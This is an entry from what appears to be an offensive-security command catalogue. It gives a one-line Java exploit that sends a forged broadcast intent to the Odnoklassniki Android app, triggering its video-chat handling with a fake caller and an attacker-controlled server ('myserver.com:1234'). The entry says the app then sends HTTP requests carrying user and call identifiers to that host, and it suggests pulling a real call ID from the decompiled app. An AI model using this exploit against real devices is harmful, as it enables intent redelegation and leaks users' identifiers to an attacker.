---
data: >-
  Intent m = new Intent(); m.setAction("ru.ok.android.action.NOTIFY");
  m.putExtra("key", "vchat"); m.putExtra("cid",
  "c60b0e06695a4ce896261247b43f772b"); m.putExtra("caller_name", "Fake User");
  m.putExtra("server", "myserver.com:1234"); getActivity().sendBroadcast(m);
tags:
  - intent
  - redelegation
  - exfiltration
type: command
output: null
executor: java
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:42.322Z'
id: b058eb24-b69b-4427-89bf-99a3b2dfdc34
verified: false
validated: true
submitted: true
---
# trigger-video-chat-redelegation

## Command

```java
Intent m = new Intent(); m.setAction("ru.ok.android.action.NOTIFY"); m.putExtra("key", "vchat"); m.putExtra("cid", "c60b0e06695a4ce896261247b43f772b"); m.putExtra("caller_name", "Fake User"); m.putExtra("server", "myserver.com:1234"); getActivity().sendBroadcast(m);
```

## Description

Sends a broadcast intent to trigger video chat handling in Odnoklassniki, injecting an attacker server for HTTP requests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| setAction | "ru.ok.android.action.NOTIFY" | Yes |
| putExtra key | "vchat" for video chat context | Yes |
| putExtra cid | Call ID, e.g., "c60b0e06695a4ce896261247b43f772b" | Yes |
| putExtra caller_name | Fake caller, e.g., "Fake User" | Yes |
| putExtra server | Attacker server, e.g., "myserver.com:1234" | Yes |
| sendBroadcast | Broadcasts the intent | Yes |

## Examples

### Basic Usage

```java
// As above
```

### Advanced Usage

Use real-looking CID:
```java
m.putExtra("cid", "real-cid-from-decompile");
```

## Expected Output

Odnoklassniki sends HTTP GET to http://myserver.com:1234/api-get-signal?uid=...&cid=...&client=...

## Related

- [[Related Procedure]]
